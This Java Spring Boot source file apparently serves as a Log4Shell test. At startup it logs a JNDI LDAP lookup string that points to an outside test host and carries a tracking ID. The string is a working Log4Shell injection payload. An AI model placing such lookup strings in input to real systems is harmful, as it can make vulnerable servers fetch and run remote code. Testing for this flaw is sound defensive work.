package com.example.log4j;

import org.apache.log4j.ConsoleAppender;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.log4j.PatternLayout;
import org.springframework.boot.ApplicationRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;

/**
 * @author Greg Baker (gregory.j.baker@hrsdc-rhdcc.gc.ca)
 * @since 0.0.0
 */
@SpringBootApplication
public class Application {

	private static final Logger log = LogManager.getLogger(Application.class);

	public static void main(String[] args) {
		Logger.getRootLogger().addAppender(new ConsoleAppender(new PatternLayout("%d{ISO8601} [%t] %-5p %c %x - %m%n")));
		SpringApplication.run(Application.class, args);
	}

	@Bean ApplicationRunner applicationRunner() {
		final var id = "77136afc-275d-4695-b872-fcc8ab676bdd";
		return args -> log.info(String.format("${jndi:ldap://log4jshell-test.youth-digital-gateway.ca:3890/%s}", id));
	}

}